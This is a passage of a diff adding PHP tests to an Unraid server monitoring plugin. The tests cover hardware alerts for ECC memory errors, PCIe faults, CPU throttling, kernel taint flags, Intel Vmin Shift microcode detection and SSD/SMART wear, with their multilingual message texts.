+    $ecc(['dimm0' => [12, 0, 'DIMM_A1'], 'dimm1' => [0, 1, 'DIMM_B1']], 4);
+    $a = $round($now + 2100, $bootA)[0];
+    same('memory: what the controller counted beyond its modules — on the controller, by its name', [['hw_ecc'], 'ie31200 (mc0)', 4],
+        [$a, watchmanHwText($entry('hw_ecc:aaaaaaaa:mc0') ?? [])['where'] ?? null, $entry('hw_ecc:aaaaaaaa:mc0')['p']['day'] ?? null]);
+    $ecc(['dimm0' => [13, 0, 'DIMM_A1'], 'dimm1' => [0, 1, 'DIMM_B1']], 4);
+    $round($now + 86400, $bootA);
+    same('memory: a new day counts from 0', ['d' => date('Y-m-d', $now + 86400), 'ce' => ['mc0/dimm0' => 1]], readJson($paths['hw']['ram'])['day'] ?? null);
+    // a counter lower within a boot (EDAC's reset_counters, a driver reloaded): from 0 on — no negative, nothing
+    $ecc(['dimm0' => [0, 0, 'DIMM_A1'], 'dimm1' => [0, 0, 'DIMM_B1']]);
+    $n = count($book);
+    same('memory: counters reset within a boot — nothing, no entry', [[], $n], [$round($now + 86700, $bootA)[0], count($book)]);
+
+    // a reboot: the counters at 0 are no drop; what counts after it is news
+    $irq(0);
+    same('reboot: a new boot, every counter at 0 — counted from 0, nothing told, its boot in his hw.json', [[], 'zero', $bootB],
+        [($r = $round($now + 90000, $bootB))[0], $r[1]['start'], readJson($paths['hw_file'])['boot'] ?? null]);
+    $irq(1);
+    same('reboot: a machine check after it — a new entry of this boot', [['hw_mce'], true], [$round($now + 90300, $bootB)[0], $entry('hw_mce:bbbbbbbb') !== null]);
+    $irq(2);
+    $put('../ram/x', '');
+    $book = [];
+    same('reboot: counters not at 0 at a new boot\'s first look (after a watch) — since the start, so told', [['hw_mce'], 'zero'],
+        [($r = $round($now + 95000, 'cccccccc-0000'))[0], $r[1]['start']]);
+
+    // PCIe: corrected ones above 100 an hour quiet, once an hour; not correctable told
+    $anew();
+    $aer(5);
+    $round($now, $bootA);
+    $aer(55);
+    same('PCIe: 50 corrected in the hour — nothing', [], $round($now + 300, $bootA)[0]);
+    $aer(110);
+    $a = $round($now + 600, $bootA)[0];
+    $e = $entry('hw_aer:aaaaaaaa:0000:01:00.0');
+    same('PCIe: 105 in the hour — a quiet line, with the device and its driver', [['hw_aer'], false, 105, '0000:01:00.0 (nvme)', null],
+        [$a, watchmanImportant($e ?? []), $e['p']['hour'] ?? null, watchmanHwText($e ?? [])['dev'] ?? null, watchmanHwVariant($e ?? [])]);
+    $book = array_map(fn (array $x): array => ['noted' => $now + 600, 'by' => 'page'] + $x, $book);
+    $aer(200);
+    same('PCIe: noted, the burst goes on — not again within the hour', [], $round($now + 900, $bootA)[0]);
+    $aer(400);
+    same('PCIe: an hour after the note, still bursting — once more', ['hw_aer'], $round($now + 4500, $bootA)[0]);
+    $aer(400, 1);
+    $a = $round($now + 4800, $bootA)[0];
+    $e = $entry('hw_aer:aaaaaaaa:0000:01:00.0');
+    same('PCIe: one not correctable — the open entry told, its own words', [[], true, 'hw_aer_bad', 1], [$a, watchmanImportant($e ?? []), watchmanHwVariant($e ?? []),
+        watchmanHwText($e ?? [])['bad'] ?? null]);
+
+    // the CPU slowed down for heat
+    $anew();
+    $throttle(1000, 2000);
+    $round($now, $bootA);
+    $throttle(31000, 2000);
+    same('throttle: half a minute in the hour — nothing', [], $round($now + 300, $bootA)[0]);
+    $throttle(71000, 2000);
+    $a = $round($now + 600, $bootA)[0];
+    $e = $entry('hw_throttle:aaaaaaaa');
+    same('throttle: 70 s in the hour — a quiet line', [['hw_throttle'], false, ['minutes' => 1, 'total' => 1]], [$a, watchmanImportant($e ?? []), $e['p'] ?? null]);
+
+    // the kernel's flags since this boot's first look
+    $anew();
+    $taint(4096 | 8192);
+    $round($now, $bootA);
+    $taint(4096 | 8192 | 512);
+    $a = $round($now + 300, $bootA)[0];
+    $e = $entry('hw_kernel:aaaaaaaa');
+    same('kernel: a warning — a quiet line (Unraid\'s own O and E never)', [['hw_kernel'], false, ['W'], 'hw_kernel_warn'],
+        [$a, watchmanImportant($e ?? []), $e['p']['flags'] ?? null, watchmanHwVariant($e ?? [])]);
+    same('kernel: the same flags next round — nothing', [], $round($now + 600, $bootA)[0]);
+    $taint(4096 | 8192 | 512 | 128);
+    $a = $round($now + 900, $bootA)[0];
+    $e = $entry('hw_kernel:aaaaaaaa');
+    same('kernel: it died (D) — the open entry told, the worst flag first', [[], true, ['D', 'W'], null], [$a, watchmanImportant($e ?? []), $e['p']['flags'] ?? null,
+        watchmanHwVariant($e ?? [])]);
+    $book = array_map(fn (array $x): array => ['noted' => $now + 900] + $x, $book);
+    same('kernel: noted, the flags stay until the next start — nothing more', [], $round($now + 1200, $bootA)[0]);
+    $taint(4096 | 8192 | 512 | 128 | 16384);
+    same('kernel: a CPU stuck (L) — a new entry, told', [['hw_kernel'], ['D', 'L', 'W']], [$round($now + 1500, $bootA)[0], $entry('hw_kernel:aaaaaaaa')['p']['flags'] ?? null]);
+
+    // the night shift and the day share this boot's counters: nothing told twice across an array stop
+    $anew();
+    $irq(0);
+    $round($now, $bootA);
+    $irq(1);
+    same('night: the day tells a machine check', ['hw_mce'], $round($now + 300, $bootA)[0]);
+    $irq(2);
+    $book = [];             // the night's own book
+    same('night: the night shift tells the next one (its book), without the pool', [['hw_mce'], $bootA], [$round($now + 600, $bootA, false, $now - 86400)[0],
+        readJson($paths['hw_file'])['boot'] ?? null]);
+    same('night: the day after it — nothing twice', [], $round($now + 900, $bootA)[0]);
+    @unlink($paths['hw']['ram']);
+    $book = [];
+    same('night: a night shift long after the start without the RAM file — normal', [[], 'look'], [($r = $round($now + 1200, $bootB, false, $now - 86400))[0], $r[1]['start']]);
+    @unlink($paths['hw']['ram']);
+    same('night: right after a start — every count since it is news', [['hw_mce'], 'zero'], [($r = $round($now + 1500, $bootB, false, $now + 1000))[0], $r[1]['start']]);
+
+    // the area's light
+    $base = ['time' => $now, 'hired' => true, 'on_watch' => $now - 86400, 'round' => ['last' => $now - 60], 'book' => []];
+    $light = function (array $change) use ($base): array {
+        $a = watchmanCats(array_replace($base, $change))['areas']['hw'];
+        return [$a['level'], $a['why']];
+    };
+    $good = ['time' => $now - 60, 'mce' => ['mce' => 0, 'thr' => null, 'dfr' => null], 'ecc' => ['ce' => 0, 'ue' => 0, 'modules' => 2, 'controllers' => 1]];
+    same('light: grey before his first look; green; no ECC counters: green with «!»; a look over an hour old: yellow; an important entry open: red',
+        [['none', ['hw_never']], ['ok', []], ['note', ['hw_no_ecc']], ['warn', ['hw_silent']], ['danger', ['open_tell']], ['warn', ['open']]],
+        [$light([]), $light(['hw' => $good]), $light(['hw' => ['ecc' => null] + $good]), $light(['hw' => ['time' => $now - 7200] + $good]),
+         $light(['hw' => $good, 'book' => [['id' => 'x', 'kind' => 'hw_mce', 'time' => $now, 'last' => $now, 'open' => true, 'tell' => true]]]),
+         $light(['hw' => $good, 'book' => [['id' => 'x', 'kind' => 'hw_throttle', 'time' => $now, 'last' => $now, 'open' => true, 'tell' => false]]])]);
+
+    // no chain: a machine check beside a new login is no incident (a flash change beside it is)
+    $login = ['noted' => null] + watchmanEntry('login_new_ip', 'ip:203.0.113.9', $now, ['ip' => '203.0.113.9']);
+    $mce = ['important' => true] + watchmanEntry('hw_mce', 'hw_mce:aaaaaaaa', $now + 60, ['mce' => 1]);
+    $go = watchmanEntry('flash_go', 'flash_go', $now + 60, []);
+    same('chains: a machine check never joins one — a flash change does', [0, 1], [count(watchmanChains([$login, $mce], $now + 120)), count(watchmanChains([$login, $go], $now + 120))]);
+
+    // the words: every kind and variant in five languages, nothing left unfilled
+    $samples = [['kind' => 'hw_mce', 'p' => ['mce' => 2, 'thr' => 1, 'dfr' => 0]], ['kind' => 'hw_ecc', 'p' => ['where' => 'mc0/dimm0', 'label' => 'DIMM_A1', 'ce' => 12, 'ue' => 0, 'day' => 10]],
+        ['kind' => 'hw_ecc', 'p' => ['where' => 'mc0/dimm1', 'label' => '', 'ce' => 0, 'ue' => 1, 'day' => 0]],
+        ['kind' => 'hw_aer', 'p' => ['dev' => '0000:01:00.0', 'driver' => 'nvme', 'cor' => 400, 'nonfatal' => 0, 'fatal' => 0, 'hour' => 200]],
+        ['kind' => 'hw_aer', 'p' => ['dev' => '0000:01:00.0', 'driver' => '', 'cor' => 400, 'nonfatal' => 1, 'fatal' => 1, 'hour' => 0]],
+        ['kind' => 'hw_throttle', 'p' => ['minutes' => 3, 'total' => 40]]];
+    foreach (array_keys(WATCH_HW_TAINT) as $f) {
+        $samples[] = ['kind' => 'hw_kernel', 'p' => ['flags' => [$f, 'W']]];
+    }
+    $left = [];
+    foreach (['en', 'de', 'it', 'fr', 'es'] as $lang) {
+        foreach ($samples as $x) {
+            $params = ['n' => 2] + watchmanHwText($x);
+            foreach ([watchmanEntryKey($x), "check.{$x['kind']}", "notify.{$x['kind']}", "fold.{$x['kind']}"] as $key) {
+                $text = officeNotifyText('watchman', $key, $params, $lang);
+                if ($text === $key || preg_match('/\{[a-z_]+\}/', $text)) {
+                    $left[] = "$lang $key: $text";
+                }
+            }
+        }
+    }
+    same('words: every kind and shape (memory and PCIe not corrected, each of the kernel\'s flags) in five languages, every placeholder filled', [], $left);
+    same('words: the shapes — the kernel\'s worst flag', ['hw_kernel', 'hw_kernel_page', 'hw_kernel_mce', 'hw_kernel_lockup', 'hw_kernel_warn'],
+        array_map(fn ($f) => watchmanEntryKey(['kind' => 'hw_kernel', 'p' => ['flags' => [$f]]]), array_keys(WATCH_HW_TAINT)) === ['entry.hw_kernel', 'entry.hw_kernel_page',
+        'entry.hw_kernel_mce', 'entry.hw_kernel_lockup', 'entry.hw_kernel_warn'] ? ['hw_kernel', 'hw_kernel_page', 'hw_kernel_mce', 'hw_kernel_lockup', 'hw_kernel_warn'] : null);
+
+    // a whole round: the night shift's places keep the hardware (RAM) but not his hw.json (the pool); the entries in book-more.json
+    check('night paths: the hardware yes (RAM), his hw.json no (the pool)', isset(watchmanNightPaths()['hw']) && !isset(watchmanNightPaths()['hw_file']));
+    $anew();
+    $src = "$tmp/src";
+    $data = "$tmp/round";
+    foreach (['plugins', 'extra', 'ssh/root'] as $d) {
+        @mkdir("$src/$d", 0700, true);
+    }
+    $rp = ['syslog' => "$src/syslog", 'plugins' => "$src/plugins", 'go' => "$src/go", 'extra' => "$src/extra", 'passwd' => "$src/passwd",
+           'shadow' => "$src/shadow", 'ssh' => "$src/ssh", 'sec' => "$src/sec.ini", 'sec_nfs' => "$src/sec_nfs.ini", 'share_cfg' => "$src/share.cfg",
+           'etc_passwd' => "$src/passwd", 'boot_id' => "$src/boot_id", 'stat' => "$src/stat", 'hw' => $paths['hw'], 'hw_file' => "$data/hw.json"];
+    file_put_contents($rp['syslog'], '');
+    file_put_contents($rp['passwd'], "root:x:0:0::/root:/bin/bash\n");
+    foreach (['go', 'shadow', 'sec', 'sec_nfs', 'share_cfg'] as $k) {
+        file_put_contents($rp[$k], '');
+    }
+    file_put_contents($rp['boot_id'], "$bootA\n");
+    file_put_contents($rp['stat'], 'btime ' . ($now - 86400) . "\n");
+    $irq(0);
+    $ecc(['dimm0' => [0, 0, 'DIMM_A1']]);
+    watchmanRound($rp, $data, 1000, $now, fn () => [], false);
+    $irq(1);
+    $r = watchmanRound($rp, $data, 1000, $now + 300, fn () => [], false);
+    $page = watchmanPageState($data, $now + 310, false);
+    $mine = array_values(array_filter($page['book'], fn ($e) => $e['kind'] === 'hw_mce'))[0] ?? [];
+    same('round: a machine check — added, told, his page\'s part and light, the entry\'s area, no technique',
+        [['hw_mce'], ['hw_mce'], 1, 1, 'danger', 'hw', true],
+        [$r['added'], array_column($r['told'], 'kind'), $page['hw']['mce']['mce'] ?? null, $page['hw']['ecc']['modules'] ?? null, $page['cats']['hw']['level'] ?? null,
+         $mine['cat'] ?? null, array_key_exists('attack', $mine) && $mine['attack'] === null]);
+    same('round: the entry in book-more.json, never in book.json (an office before 1.96 never sees it)', [['hw_mce'], []],
+        [array_column(readJson("$data/book-more.json")['entries'] ?? [], 'kind'),
+         array_values(array_filter(array_column(readJson("$data/book.json")['entries'] ?? [], 'kind'), fn ($k) => str_starts_with($k, 'hw_')))]);
+    hardeningRm($tmp);
+}
+
+/**
+ * Known CPU faults (1.96 step 10, agent/desks/watchman-hw.php, watchman-cpu-faults.json): Intel's 13th/14th Gen desktop
+ * «Vmin Shift» — the 14900K with 0x125 (a tip), 0x12B and 0x12F (none); the 13500, HX mobile and Xeon E on the same model
+ * number, the K beside the KF, a T: none; another vendor or family: none; a table not in its shape: none. The kernel's
+ * old_microcode: «Vulnerable» a tip, no file (a kernel before 6.16) nothing and no error. Both tips in the area `hw`, their
+ * words in five languages, the machine checks he counted as the signs.
+ */
+function testWatchmanCpuFaults(): void
+{
+    $info = fn (string $name, string $code, int $model = 183, string $vendor = 'GenuineIntel', int $family = 6) => implode('', array_map(
+        fn (int $i) => "processor\t: $i\nvendor_id\t: $vendor\ncpu family\t: $family\nmodel\t\t: $model\nmodel name\t: $name\nstepping\t: 1\n"
+            . "microcode\t: " . ($i === 1 ? '0x12f' : $code) . "\nflags\t\t: fpu vme rdseed\n\n", [0, 1]));
+    $fault = fn (string $text) => watchmanHwCpuFault(['model' => preg_match('/^model name\s*:\s*(.+)$/m', $text, $m) ? $m[1] : null] + watchmanHwCpuInfo($text));
+    same('cpuinfo: family, model number, the lowest microcode of its CPUs', ['vendor_id' => 'GenuineIntel', 'family' => 6, 'model_no' => 183, 'microcode' => 0x125],
+        watchmanHwCpuInfo($info('13th Gen Intel(R) Core(TM) i9-13900K', '0x125')));
+    $cases = [
+        ['14900K with 0x125 — the fault, a BIOS update', 'Intel(R) Core(TM) i9-14900K', '0x125', 183, 'intel_vmin'],
+        ['… with 0x129 (OEMs only) — still', 'Intel(R) Core(TM) i9-14900K', '0x129', 183, 'intel_vmin'],
+        ['… with 0x12B — Intel\'s correction: none', 'Intel(R) Core(TM) i9-14900K', '0x12b', 183, null],
+        ['… with 0x12F — none', 'Intel(R) Core(TM) i9-14900K', '0x12f', 183, null],
+        ['13900KF with 0x11e', '13th Gen Intel(R) Core(TM) i9-13900KF', '0x11e', 183, 'intel_vmin'],
+        ['i5-13600K (a K) with 0x104', '13th Gen Intel(R) Core(TM) i5-13600K', '0x104', 183, 'intel_vmin'],
+        ['i5-13500 (no K): not affected', '13th Gen Intel(R) Core(TM) i5-13500', '0x104', 183, null],
+        ['i9-13900HX (mobile, the same model number): not affected', '13th Gen Intel(R) Core(TM) i9-13900HX', '0x104', 183, null],
+        ['Xeon E-2488 (the same model number): not affected', 'Intel(R) Xeon(R) E-2488', '0x104', 183, null],
+        ['i9-13900T (not on the list): none', '13th Gen Intel(R) Core(TM) i9-13900T', '0x104', 183, null],
+        ['an i7-14700 on model 191: the model decides too', 'Intel(R) Core(TM) i7-14700', '0x104', 191, null],
+        ['12th Gen (model 151): none', '12th Gen Intel(R) Core(TM) i9-12900K', '0x2c', 151, null],
+    ];
+    foreach ($cases as [$what, $name, $code, $model, $want]) {
+        same("cpu fault: $what", $want, $fault($info($name, $code, $model))['id'] ?? null);
+    }
+    same('cpu fault: another vendor — none', null, $fault($info('AMD Ryzen 9 9950X 16-Core Processor', '0xb404023', 68, 'AuthenticAMD', 26)));
+    same('cpu fault: the words — the correction as people write it', ['tip' => 'cpu_fault', 'name' => 'Intel Vmin Shift Instability', 'min' => '12B'],
+        array_intersect_key($fault($info('Intel(R) Core(TM) i9-14900K', '0x125')) ?? [], ['tip' => 1, 'name' => 1, 'min' => 1]));
+    $tmp = hardeningTmp('watch-cpu');
+    file_put_contents("$tmp/odd.json", json_encode(['v' => 2, 'faults' => [['id' => 'x']]]));
+    $cpu = ['model' => 'Intel(R) Core(TM) i9-14900K'] + watchmanHwCpuInfo($info('Intel(R) Core(TM) i9-14900K', '0x125'));
+    same('cpu fault: a table of another version, or none — nothing (never a guess)', [null, null], [watchmanHwCpuFault($cpu, "$tmp/odd.json"), watchmanHwCpuFault($cpu, "$tmp/none.json")]);
+    same('cpu fault: no CPU facts (an older look, a part not read) — nothing', [null, null], [watchmanHwCpuFault(null), watchmanHwCpuFault(['model' => 'x'])]);
+
+    // the posture: from what watchmanCpu() reads — the kernel's old_microcode «Vulnerable» or not there
+    $p = ['cmdline' => "$tmp/cmdline", 'cpuinfo' => "$tmp/cpuinfo", 'cpu_vulns' => "$tmp/vulns"];
+    @mkdir("$tmp/vulns");
+    file_put_contents("$tmp/cmdline", "BOOT_IMAGE=/bzimage initrd=/bzroot\n");
+    file_put_contents("$tmp/cpuinfo", $info('Intel(R) Core(TM) i9-14900K', '0x125'));
+    file_put_contents("$tmp/vulns/spectre_v2", "Mitigation: Enhanced / Automatic IBRS\n");
+    $tips = fn (array $hw = []) => array_column(watchmanPosture(['cpu' => watchmanCpu($p), 'hw' => $hw ?: null], []), null, 'id');
+    $t = $tips(['mce' => ['mce' => 2, 'thr' => null, 'dfr' => null]]);
+    same('posture: the known fault — advice, no link (the BIOS isn\'t in Unraid), the CPU, its microcode, the correction, the machine checks counted',
+        ['advice', null, ['cpu' => 'Intel(R) Core(TM) i9-14900K', 'microcode' => '0x125', 'min' => '0x12B', 'fault' => 'Intel Vmin Shift Instability', 'mce' => '2'], false],
+        [$t['cpu_fault']['level'] ?? null, array_key_exists('link', $t['cpu_fault'] ?? []) ? $t['cpu_fault']['link'] : 'x', $t['cpu_fault']['p'] ?? null, isset($t['old_microcode'])]);
+    same('posture: no old_microcode file (a kernel before 6.16) — no tip, no error; the machine checks not counted: –', [false, '–'],
+        [isset($tips()['old_microcode']), $tips()['cpu_fault']['p']['mce'] ?? null]);
+    file_put_contents("$tmp/vulns/old_microcode", "Vulnerable\n");
+    same('posture: the kernel says old microcode — a tip of its own', ['advice', ['cpu' => 'Intel(R) Core(TM) i9-14900K', 'microcode' => '0x125']],
+        [$tips()['old_microcode']['level'] ?? null, $tips()['old_microcode']['p'] ?? null]);
+    file_put_contents("$tmp/vulns/old_microcode", "Not affected\n");
+    file_put_contents("$tmp/cpuinfo", $info('Intel(R) Core(TM) i9-14900K', '0x12f'));
+    same('posture: corrected microcode, the kernel content — neither tip', [false, false], [isset($tips()['cpu_fault']), isset($tips()['old_microcode'])]);
+    file_put_contents("$tmp/cpuinfo", $info('Intel(R) Core(TM) i9-14900K', '0x125'));
+    $sig = $tips()['cpu_fault']['sig'] ?? null;
+    file_put_contents("$tmp/cpuinfo", $info('Intel(R) Core(TM) i9-14900K', '0x129'));
+    check('posture: another microcode, still old — a new signature (an «I know, thanks» for the old one doesn\'t hold)', $sig !== null && $sig !== ($tips()['cpu_fault']['sig'] ?? null));
+
+    // the area: an advice not known yet — green with «!»
+    same('area: both tips in Hardware; one not known — green with «!»', ['hw', 'hw', 'note', ['tips']],
+        [watchmanCatOfTip('cpu_fault'), watchmanCatOfTip('old_microcode'),
+         ...array_values(array_intersect_key(watchmanCats(['time' => 1790000000, 'hired' => true, 'on_watch' => 1789000000, 'round' => ['last' => 1790000000],
+             'book' => [], 'hw' => ['time' => 1790000000, 'ecc' => ['ce' => 0]], 'posture' => ['tips' => [['id' => 'cpu_fault', 'level' => 'advice', 'known' => false]]]])['areas']['hw'],
+             ['level' => 1, 'why' => 1]))]);
+    $left = [];
+    foreach (['en', 'de', 'it', 'fr', 'es'] as $lang) {
+        $l = langFile(OFFICE_WEB . "/desks/watchman/lang/$lang.json");
+        foreach (['cpu_fault', 'old_microcode'] as $id) {
+            foreach (['title', 'why'] as $k) {
+                $text = (string) preg_replace_callback('/\{(\w+)\}/', fn ($m) => isset($t['cpu_fault']['p'][$m[1]]) || in_array($m[1], ['cpu', 'microcode'], true) ? 'x' : $m[0],
+                    (string) ($l["posture.$id.$k"] ?? '{missing}'));
+                if (preg_match('/\{\w+\}/', $text)) {
+                    $left[] = "$lang posture.$id.$k";
+                }
+            }
+        }
+    }
+    same('words: both tips in five languages, every placeholder one the tip gives', [], $left);
+    hardeningRm($tmp);
+}
+
+/**
+ * SSD wear and the SMART history (1.96 step 11, agent/desks/watchman-hw.php hw_wear) from Unraid's own SMART files: the
+ * disks of disks.ini (never the flash), one without a file «not read»; the first reading normal; SATA's five forerunners
+ * told with «+n in 30 days», 199 quiet (once a day); NVMe's critical warning (appears or changes) and media errors told,
+ * the life used at 90 % (and 255, the standard's «more than 254») and unsafe shutdowns quiet; a point a day, 90 days, a
+ * disk gone that long forgotten; the light; the words; a whole round (hw.json, the page, book-more.json).
+ */
+function testWatchmanWear(): void
+{
+    $tmp = hardeningTmp('watch-wear');
+    $smart = "$tmp/smart";
+    @mkdir($smart, 0700, true);
+    file_put_contents("$tmp/disks.ini", "[\"flash\"]\nname=\"flash\"\ndevice=\"sda\"\nid=\"Ultra_Fit_4C53\"\ntype=\"Flash\"\n"
+        . "[\"disk1\"]\nname=\"disk1\"\ndevice=\"sdb\"\nid=\"WDC_WD80EFAX_7HJ1\"\ntype=\"Data\"\nrotational=\"1\"\n"
+        . "[\"cache\"]\nname=\"cache\"\ndevice=\"nvme0n1\"\nid=\"Samsung_SSD_980_PRO_1TB_S5GX\"\ntype=\"Cache\"\nrotational=\"0\"\n"
+        . "[\"cache2\"]\nname=\"cache2\"\ndevice=\"nvme1n1\"\nid=\"WD_BLACK_SN850X_2TB_23\"\ntype=\"Cache\"\nrotational=\"0\"\n"
+        . "[\"disk2\"]\nname=\"disk2\"\ndevice=\"\"\nid=\"\"\ntype=\"Data\"\n");
+    $ata = function (array $raw) use ($smart): void {
+        $rows = '';
+        foreach ([5 => 'Reallocated_Sector_Ct', 9 => 'Power_On_Hours', 187 => 'Reported_Uncorrect', 188 => 'Command_Timeout', 197 => 'Current_Pending_Sector',
+                  198 => 'Offline_Uncorrectable', 199 => 'UDMA_CRC_Error_Count'] as $id => $name) {
+            $rows .= sprintf("%3d %-24s 0x0032   100   100   000    Old_age   Always       -       %d\n", $id, $name, $raw[$id] ?? ($id === 9 ? 31000 : 0));
+        }
+        file_put_contents("$smart/disk1", "ID# ATTRIBUTE_NAME          FLAG     VALUE WORST THRESH TYPE      UPDATED  WHEN_FAILED RAW_VALUE\n$rows");
+    };
+    $nvme = function (string $cw, int $used, int $media, int $unsafe) use ($smart): void {
+        file_put_contents("$smart/cache", "SMART/Health Information (NVMe Log 0x02)\nCritical Warning:                   $cw\nTemperature:                        41 Celsius\n"
+            . "Available Spare:                    100%\nAvailable Spare Threshold:          10%\nPercentage Used:                    $used%\n"
+            . "Data Units Written:                 52,512,190 [26.8 TB]\nPower On Hours:                     8,120\nUnsafe Shutdowns:                   $unsafe\n"
+            . "Media and Data Integrity Errors:    $media\n");
+    };
+    $paths = ['smart' => $smart, 'disks_ini' => "$tmp/disks.ini"];
+    $ata([]);
+    $nvme('0x00', 89, 0, 12);
+    $look = watchmanHwWearLook($paths);
+    $book = [];
+    $now = 1790000000;
+    same('look: the disks of disks.ini by id — never the flash or an empty slot; one without a file «not read»',
+        [['WDC_WD80EFAX_7HJ1', 'Samsung_SSD_980_PRO_1TB_S5GX', 'WD_BLACK_SN850X_2TB_23'], ['ata', 'nvme', null], [true, true, false],
+         ['a5' => 0, 'a187' => 0, 'a188' => 0, 'a197' => 0, 'a198' => 0, 'a199' => 0], ['cw' => 0, 'spare' => 100, 'spare_thr' => 10, 'used' => 89, 'media' => 0, 'unsafe' => 12]],
+        [array_keys($look), array_column($look, 'kind'), array_map(fn ($l) => $l['v'] !== null, array_values($look)), $look['WDC_WD80EFAX_7HJ1']['v'] ?? null,
+         $look['Samsung_SSD_980_PRO_1TB_S5GX']['v'] ?? null]);
+    same('look: without the places (the night shift) — nothing', null, watchmanHwWearLook([]));
+    [$a, $known, $page] = watchmanHwWearCompare(null, $look, $now, $book);
+    same('first reading: normal — nothing told, a point of today per disk read, the unread one on the page', [[], 2, 1, [null]],
+        [$a, count($known['disks']), count($known['disks']['WDC_WD80EFAX_7HJ1']['days'] ?? []),
+         array_column(array_filter($page, fn ($d) => $d['read'] === null), 'read')]);
+    $step = function (int $t) use (&$known, &$book, $paths): array {
+        [$a, $known, $page] = watchmanHwWearCompare($known, watchmanHwWearLook($paths), $t, $book);
+        return [$a, $page];
+    };
+    $entry = function (string $key) use (&$book): ?array {
+        return array_values(array_filter($book, fn ($e) => $e['key'] === $key && watchmanOpen($e)))[0] ?? null;
+    };
+    // SATA
+    $ata([5 => 8, 199 => 3]);
+    [$a] = $step($now + 3600);
+    $e5 = $entry('hw_wear:WDC_WD80EFAX_7HJ1:a5');
+    $crc = $entry('hw_wear:WDC_WD80EFAX_7HJ1:crc');
+    same('SATA: reallocated sectors grow — told, with the 30 days; CRC errors — quiet, «mostly the cable»',
+        [['hw_wear', 'hw_wear'], true, '5 Reallocated_Sector_Ct', 8, 8, false, 'hw_wear_crc', null],
+        [$a, watchmanImportant($e5 ?? []), watchmanHwText($e5 ?? ['kind' => 'hw_wear'])['attr'] ?? null, $e5['p']['raw'] ?? null, $e5['p']['grew'] ?? null,
+         watchmanImportant($crc ?? []), watchmanHwVariant($crc ?? []), watchmanHwVariant($e5 ?? [])]);
+    $ata([5 => 12, 199 => 3]);
+    same('SATA: more in the same burst — the open entry brought up to date', [[], 12, 12], [$step($now + 7200)[0], $entry('hw_wear:WDC_WD80EFAX_7HJ1:a5')['p']['raw'] ?? null,
+        $entry('hw_wear:WDC_WD80EFAX_7HJ1:a5')['p']['grew'] ?? null]);
+    $book = array_map(fn (array $x): array => ['noted' => $now + 7300, 'by' => 'page'] + $x, $book);
+    $ata([5 => 12, 199 => 5]);
+    same('SATA: CRC errors noted, more the same day — not again (once a day)', [], $step($now + 10800)[0]);
+    $ata([5 => 13, 199 => 5]);
+    same('SATA: a forerunner noted, it grows again — told again', ['hw_wear'], $step($now + 14400)[0]);
+    $ata([5 => 13, 199 => 6]);
+    same('SATA: CRC errors a day later — a quiet line again', ['hw_wear'], $step($now + 86400 + 14400)[0]);
+    // NVMe
+    $book = [];
+    $nvme('0x01', 90, 2, 13);
+    [$a] = $step($now + 2 * 86400);
+    $kinds = array_map(fn ($e) => [watchmanHwVariant($e), watchmanImportant($e)], $book);
+    sort($kinds);
+    same('NVMe: a critical warning, media errors — told; 90 % used, an unsafe shutdown — quiet', [4, [['hw_wear_media', true], ['hw_wear_unsafe', false],
+        ['hw_wear_used', false], ['hw_wear_warning', true]], '0x01'], [count($a), $kinds, $entry('hw_wear:Samsung_SSD_980_PRO_1TB_S5GX:warning')['p']['cw'] ?? null]);
+    $nvme('0x01', 95, 2, 13);
+    same('NVMe: the same warning, 95 % — nothing new', [], $step($now + 2 * 86400 + 3600)[0]);
+    $nvme('0x05', 255, 2, 13);
+    same('NVMe: the warning changes, the life «more than 254» (255) — the open entries brought up to date (one open line per thing)', [[], '0x05', 255],
+        [$step($now + 2 * 86400 + 7200)[0], $entry('hw_wear:Samsung_SSD_980_PRO_1TB_S5GX:warning')['p']['cw'] ?? null,
+         $entry('hw_wear:Samsung_SSD_980_PRO_1TB_S5GX:used')['p']['used'] ?? null]);
+    // the history: a point a day, 90 days; the 30 days measured from the oldest point within them
+    $ata([5 => 13, 199 => 6]);
+    $known['disks']['WDC_WD80EFAX_7HJ1']['days'] = array_map(fn ($i) => [date('Y-m-d', $now - (100 - $i) * 86400), ['a5' => $i < 75 ? 1 : 5, 'a199' => 0]], range(0, 99));
+    $known['disks']['Gone_Disk'] = ['name' => 'disk9', 'kind' => 'ata', 'last' => ['a5' => 0], 'days' => [[date('Y-m-d', $now - 91 * 86400), ['a5' => 0]]]];
+    $known['disks']['Away_Disk'] = ['name' => 'disk8', 'kind' => 'ata', 'last' => ['a5' => 0], 'days' => [[date('Y-m-d', $now - 20 * 86400), ['a5' => 0]]]];
+    [, $page] = $step($now);
+    $d1 = $known['disks']['WDC_WD80EFAX_7HJ1'];
+    same('history: at most 90 points, today\'s last; the 30 days from the oldest point within them (+12 since 1); a disk gone 91 days forgotten, one away 20 days kept',
+        [90, date('Y-m-d', $now), 12, false, true],
+        [count($d1['days']), $d1['days'][89][0] ?? null, array_values(array_filter($page, fn ($d) => $d['id'] === 'WDC_WD80EFAX_7HJ1'))[0]['grew30']['a5'] ?? null,
+         isset($known['disks']['Gone_Disk']), isset($known['disks']['Away_Disk'])]);
+
+    // the light
+    $base = ['time' => $now, 'hired' => true, 'on_watch' => $now - 86400, 'round' => ['last' => $now - 60], 'book' => []];
+    $light = function (array $wear) use ($base, $now): array {
+        $a = watchmanCats($base + ['hw' => ['time' => $now - 60, 'ecc' => ['ce' => 0], 'wear' => $wear]])['areas']['hw'];
+        return [$a['level'], $a['why']];
+    };
+    same('light: a critical warning now — red; 90 % used — yellow; a disk without a reading — «!»; all well — green',
+        [['danger', ['hw_nvme_warning']], ['warn', ['hw_worn']], ['note', ['hw_unread']], ['ok', []]],
+        [$light([['name' => 'cache', 'read' => $now, 'cw' => 1]]), $light([['name' => 'cache', 'read' => $now, 'cw' => 0, 'used' => 92]]),
+         $light([['name' => 'cache2', 'read' => null]]), $light([['name' => 'disk1', 'read' => $now, 'a5' => 0]])]);
+
+    // the words
+    $left = [];
+    $samples = [['what' => 'a5', 'name' => 'disk1', 'attr' => 5, 'raw' => 13, 'grew' => 8], ['what' => 'crc', 'name' => 'disk1', 'attr' => 199, 'raw' => 6, 'grew' => 3],
+        ['what' => 'warning', 'name' => 'cache', 'cw' => '0x01'], ['what' => 'media', 'name' => 'cache', 'media' => 2, 'grew' => 2],
+        ['what' => 'used', 'name' => 'cache', 'used' => 90], ['what' => 'unsafe', 'name' => 'cache', 'unsafe' => 13, 'grew' => 1]];
+    foreach (['en', 'de', 'it', 'fr', 'es'] as $lang) {
+        foreach ($samples as $p) {
+            $x = ['kind' => 'hw_wear', 'p' => $p];
